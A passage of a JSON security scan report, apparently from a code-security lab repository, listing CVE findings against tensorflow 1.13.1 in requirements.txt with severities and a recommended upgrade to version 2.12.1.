            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2021-37658 (severity: medium, fixed in 2.5.0)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2021-37658](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-37658)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "ab4b17dfd5ffe6fcbc6ff7bff0914c64f247fa63"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2021-37672",
          "ruleIndex": 191,
          "level": "warning",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2021-37672 (severity: medium, fixed in 2.5.0)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2021-37672](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-37672)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "19177002bb5e60860b0008ae75fc227003222ad0"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2021-37646",
          "ruleIndex": 192,
          "level": "warning",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2021-37646 (severity: medium, fixed in 2.5.0)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2021-37646](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-37646)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "afa80c9206b16584fcd266938aae977a120b7cbf"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2021-37670",
          "ruleIndex": 193,
          "level": "warning",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2021-37670 (severity: medium, fixed in 2.5.0)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2021-37670](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-37670)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "e9ab5095a7247230ea5e9acd856a97d32a7f3f67"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2021-37674",
          "ruleIndex": 194,
          "level": "warning",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2021-37674 (severity: medium, fixed in 2.5.0)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2021-37674](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-37674)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "408dc77cc2e30bcdd72fa36cea0707bf010c6e95"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2021-37675",
          "ruleIndex": 195,
          "level": "warning",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2021-37675 (severity: medium, fixed in 2.5.0)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2021-37675](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-37675)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "64770f6806fa8a184f631e17961696423687d75a"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2021-37682",
          "ruleIndex": 196,
          "level": "warning",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2021-37682 (severity: medium, fixed in 2.5.0)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2021-37682](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-37682)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "c6880473130c730165cbd8fe5e6842cc7e2da5f2"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2021-37671",
          "ruleIndex": 197,
          "level": "error",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2021-37671 (severity: high, fixed in 2.5.0)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2021-37671](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-37671)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "8c3b464cd76e8bda2981fcde21e37ad193b6a547"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2021-37641",
          "ruleIndex": 198,
          "level": "warning",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2021-37641 (severity: medium, fixed in 2.5.0)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2021-37641](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-37641)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "6150c3ecb174b22246c5ce852d93ac6dcd44290a"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2021-37677",
          "ruleIndex": 199,
          "level": "warning",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2021-37677 (severity: medium, fixed in 2.5.0)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2021-37677](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-37677)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "966e194e36c609834501195608e320c68c8d730f"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2021-37681",
          "ruleIndex": 200,
          "level": "error",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2021-37681 (severity: high, fixed in 2.5.0)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2021-37681](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-37681)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "d086e62b49f7f061438bece7d9d8fa45e1f68685"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2021-37661",
          "ruleIndex": 201,
          "level": "warning",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2021-37661 (severity: medium, fixed in 2.5.0)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2021-37661](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-37661)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "fa0e5a73925dd634080f196519e4880cee419c28"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2021-37654",
          "ruleIndex": 202,
          "level": "error",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2021-37654 (severity: high, fixed in 2.5.0)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2021-37654](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-37654)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "66193aab8306ec34f3f33ca83d5d2b1fee68ea68"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2021-37655",
          "ruleIndex": 203,
          "level": "error",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2021-37655 (severity: high, fixed in 2.5.0)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2021-37655](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-37655)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "86a6be0f47f2748df798e3b15f37c848c7a1bf05"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2021-37650",
          "ruleIndex": 204,
          "level": "error",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2021-37650 (severity: high, fixed in 2.5.0)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2021-37650](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-37650)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "f38b3fe4ac72a1cc815d829805a396b31107c25a"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2021-37637",
          "ruleIndex": 205,
          "level": "error",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2021-37637 (severity: high, fixed in 2.5.0)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2021-37637](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-37637)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "867e4a156542983c9b6de4180a9aace5081ed182"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2021-37635",
          "ruleIndex": 206,
          "level": "error",
          "message": {
